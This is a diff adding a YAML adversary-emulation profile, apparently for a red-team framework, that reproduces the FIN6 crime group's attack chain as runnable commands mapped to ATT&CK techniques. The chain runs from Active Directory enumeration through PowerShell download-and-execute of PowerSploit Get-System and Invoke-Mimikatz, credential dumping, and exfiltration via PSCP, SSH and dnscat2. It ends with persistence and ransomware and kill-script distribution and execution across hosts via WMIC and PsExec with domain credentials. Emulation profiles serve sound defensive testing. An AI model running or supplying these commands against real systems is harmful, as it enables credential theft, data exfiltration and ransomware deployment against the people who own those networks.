@@ -1,0 +1,304 @@
+id: 123700e5-44c8-4894-a409-6484992c8846
+name: FIN6
+description: FIN6 is a financially motivated cyber crime group known for stealing credit card data and performing ransomware attacks. (Emu)
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- e44a39ce-0651-3ddd-8f05-f83aa2ffd657
+- 5b24eef2-7a7f-4d34-8cab-e588074c59bc
+- d30692dd-779f-4a40-b947-de23dabbb033
+- 02a96c18-f700-482d-88a8-bd311f6c41dc
+- e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c
+- 2738b811-a360-4a4f-af9d-704343ebab4d
+- a89ea459-97ec-28fd-a552-9d305f023bbe
+- ff77db3d-ded1-48da-9885-8dfc097edec0
+- 97412b40-4940-4da1-8bff-6f11d42bca26
+- fd27fe6c-4846-4e94-aef9-f6bc21ab0f0e
+- 6824cbb6-f3e1-4081-8a63-d72ae368cb23
+- 78d94199-7e0e-442b-81a6-32f8e419a7ac
+- e4027dff-280b-4964-82be-b35a40c4a493
+- 661efd66-d876-41de-88ee-ba9ec4328154
+- 44d82f6f-f367-4db7-aa65-a9e5717b1a21
+- 0864a91a-ae17-1cce-8b89-d4f8f2854699
+- e74554b8-0bc9-3d50-95a4-e45421925b49
+- b393c022-329a-4c52-ab1f-eb594ee8d3cd
+- f50f8f39-2fb0-4fe3-9e2d-9af38aee447d
+- e45dc48f-45f1-42d2-850c-4a15385c1646
+- 6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0
+- 5599b7cf-6e8d-43c1-a311-e953dd0fbd2a
+- 5dcbd042-e8e5-4f3f-8055-7284e4d5112c
+- eb4c2ff6-3534-404c-bf1c-d864a508c162
+- c29e9cc7-b34f-46c2-bdbe-a41f757eae24
+- 0c752dce-9302-4465-805f-522650aece3f
+- d77838f6-d562-3480-ad29-2cbeee8b7b45
+abilities:
+ e44a39ce-0651-3ddd-8f05-f83aa2ffd657:
+  name:  Enumerate AD person objects
+  tactic:  discovery
+  technique_name:  "Account Discovery: Domain Account"
+  technique_id:  T1087.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -f (objectcategory=person) > ad_users.txt
+ 5b24eef2-7a7f-4d34-8cab-e588074c59bc:
+  name:  Enumerate AD computer objects
+  tactic:  discovery
+  technique_name:  "Remote System Discovery"
+  technique_id:  T1018
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -f (objectcategory=computer) > ad_computers.txt
+ d30692dd-779f-4a40-b947-de23dabbb033:
+  name:  Enumerate AD Organizational Units
+  tactic:  discovery
+  technique_name:  "Domain Trust Discovery"
+  technique_id:  T1482
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -f (objectcategory=organizationalUnit) > ad_ous.txt
+ 02a96c18-f700-482d-88a8-bd311f6c41dc:
+  name:  Enumerate AD trust objects
+  tactic:  discovery
+  technique_name:  "Domain Trust Discovery"
+  technique_id:  T1482
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -gcb -sc trustdmp > ad_trustdmp.txt
+ e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c:
+  name:  Enumerate AD subnets
+  tactic:  discovery
+  technique_name:  "System Network Configuration Discovery"
+  technique_id:  T1016
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -subnets -f (objectCategory=subnet) > ad_subnets.txt
+ 2738b811-a360-4a4f-af9d-704343ebab4d:
+  name:  Enumerate AD groups
+  tactic:  discovery
+  technique_name:  "Permission Groups Discovery: Domain Groups"
+  technique_id:  T1069.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{adfind_exe}" -f (objectcategory=group) > ad_group.txt
+ a89ea459-97ec-28fd-a552-9d305f023bbe:
+  name:  PowerSploit Named-Pipe Impersonation
+  tactic:  privilege-escalation
+  technique_name:  "Access Token Manipulation"
+  technique_id:  T1134
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'"
+ ff77db3d-ded1-48da-9885-8dfc097edec0:
+  name:  PowerSploit Invoke-Mimikatz
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory - Invoke-Mimikatz"
+  technique_id:  T1003.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+ 97412b40-4940-4da1-8bff-6f11d42bca26:
+  name:  WCE Credential Access
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory - Windows Credential Editor (WCE)"
+  technique_id:  T1003.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{wce_exe}" -w -o "#{output_file}"
+ fd27fe6c-4846-4e94-aef9-f6bc21ab0f0e:
+  name:  Compress Files with 7zip (7.exe)
+  tactic:  collection
+  technique_name:  "Archive Collected Data: Archive via Utility"
+  technique_id:  T1560.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{7zip_exe}" a -mx3 ad.7z ad_*
+ 6824cbb6-f3e1-4081-8a63-d72ae368cb23:
+  name:  Exfiltration with PSCP
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  technique_id:  T1567.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{pscp_exe}" -P #{pscp_port} "#{pscp_exfil_files}" "#{pscp_remote_user}@#{pscp_remote_host}:#{pscp_drop_location}"
+ 78d94199-7e0e-442b-81a6-32f8e419a7ac:
+  name:  Exfiltrate Data via SSH
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+  technique_id:  T1567.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{putty_exe}" -ssh #{user}@#{exfil_server}
+ e4027dff-280b-4964-82be-b35a40c4a493:
+  name:  PsExec Remote Command
+  tactic:  execution
+  technique_name:  "System Services: Service Execution"
+  technique_id:  T1569.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "#{psexec_exe}" \\#{remote_host} #{remote_command}
+ 661efd66-d876-41de-88ee-ba9ec4328154:
+  name:  WMIC Remote Process Execution
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       wmic /node:#{node} process call create "#{path_to_execute}"
+ 44d82f6f-f367-4db7-aa65-a9e5717b1a21:
+  name:  Registry Run Keys
+  tactic:  persistence
+  technique_name:  "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  technique_id:  T1547.001
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "C:\Windows\System32\reg.exe" ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "#{value_name}" /t REG_SZ /d "#{data}" /f
+ 0864a91a-ae17-1cce-8b89-d4f8f2854699:
+  name:  Scheduled Task Persistence
+  tactic:  persistence
+  technique_name:  "Scheduled Task/Job: Scheduled Task"
+  technique_id:  T1053.005
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       "C:\Windows\System32\schtasks.exe" /create /tn "#{task_name}" /tr "#{task_run}" /sc #{schedule} /ru System
+ e74554b8-0bc9-3d50-95a4-e45421925b49:
+  name:  dnscat2-powershell Exfiltration
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over Alternative Protocol: Unencrypted/Obfuscated Non-C2 Protocol"
+  technique_id:  T1048.003
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       import-module "#{dnscat_ps1}"
+       Start-Dnscat2 -Domain #{dnscat2_server} -Exec cmd
+ b393c022-329a-4c52-ab1f-eb594ee8d3cd:
+  name:  WMI Ransomware Distribution
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start wmic /node:#{Ransomware_recipient} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{internal_IP}\c$\windows\temp\sss.exe c:\windows\temp\"
+ f50f8f39-2fb0-4fe3-9e2d-9af38aee447d:
+  name:  Copy Ransomware
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start copy sss.exe \\#{internal_IP}\c$\windows\temp\
+ e45dc48f-45f1-42d2-850c-4a15385c1646:
+  name:  Copy Distribution Scripts
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start copy xaa.bat \\#{internal_IP}\c$\windows\temp\
+ 6ffca252-9eb0-4ac0-93dd-35c9e7c6fae0:
+  name:  Copy Kill Scripts
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: SMB/Windows Admin Shares"
+  technique_id:  T1021.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       copy #{batch_file} \\#{internal_IP}\c$\windows\temp\
+ 5599b7cf-6e8d-43c1-a311-e953dd0fbd2a:
+  name:  Distribute Ransomware via WMI
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\sss.exe c:\windows\temp\"
+ 5dcbd042-e8e5-4f3f-8055-7284e4d5112c:
+  name:  Distribute Kill Scripts via WMI
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd.exe /c copy \\#{distribution_server}\c$\windows\temp\#{batch_file} c:\windows\temp\"
+ eb4c2ff6-3534-404c-bf1c-d864a508c162:
+  name:  Execute Kill Scripts via WMI
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\#{batch_file}"
+ c29e9cc7-b34f-46c2-bdbe-a41f757eae24:
+  name:  Execute Ransomware via WMIC
+  tactic:  execution
+  technique_name:  "Windows Management Instrumentation"
+  technique_id:  T1047
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start wmic /node:#{internal_IP} /user:#{domain_user} /password:#{password} process call create "cmd /c c:\windows\temp\sss.exe"
+ 0c752dce-9302-4465-805f-522650aece3f:
+  name:  Execute Kill Scripts via PsExec
+  tactic:  execution
+  technique_name:  "System Services: Service Execution"
+  technique_id:  T1569.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\#{batch_file}
+ d77838f6-d562-3480-ad29-2cbeee8b7b45:
+  name:  Execute Ransomware via PsExec
+  tactic:  execution
+  technique_name:  "System Services: Service Execution"
+  technique_id:  T1569.002
+  executors: 
+   - cmd:
+     platform: windows
+     command: |
+       start "#{psexec_exe}" \\#{internal_IP} -u #{domain_user} -p #{password} -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exe
